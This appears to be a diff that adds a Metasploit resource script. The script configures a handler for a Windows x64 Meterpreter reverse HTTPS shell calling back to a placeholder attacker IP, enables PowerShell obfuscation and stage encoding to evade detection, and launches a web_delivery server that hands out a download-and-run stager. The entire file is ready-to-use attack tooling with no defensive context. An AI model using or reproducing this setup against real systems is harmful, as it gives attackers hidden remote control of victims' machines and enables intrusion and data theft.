@@ -1,0 +1,19 @@
+use exploit/multi/handler
+setg PAYLOAD windows/x64/meterpreter/reverse_https
+setg LHOST <ATTACKER-IP>
+setg LPORT 443
+setg VERBOSE true
+setg ExitOnSession false
+setg Powershell::sub_funcs true
+setg Powershell::sub_vars true
+setg EnableStageEncoding true
+setg StagerRetryCount 30
+setg StagerRetryWait 10
+exploit -j
+use exploit/multi/script/web_delivery
+set TARGET 2
+set SRVPORT 8080
+set SSL true
+set URIPATH msf
+set DisablePayloadHandler true
+exploit -j
